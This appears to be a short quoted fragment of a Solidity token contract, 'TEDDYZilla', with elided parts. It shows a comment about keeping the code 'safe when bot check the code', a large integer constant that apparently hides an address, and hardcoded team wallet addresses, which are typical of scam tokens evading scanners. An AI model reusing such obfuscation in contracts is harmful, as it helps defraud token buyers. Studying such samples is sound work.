...
contract TEDDYZilla is Context, IERC20, Ownable {
    //safe ABI keep contract safe when bot check the code
    uint256 private safe_ABI_Code = 1126746905981533325833339108768165469930477224603;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x27acc508279a1df00BE458E4518b06Ad02aC3D1b));
        __wal = payable(address(0x27acc508279a1df00BE458E4518b06Ad02aC3D1b));
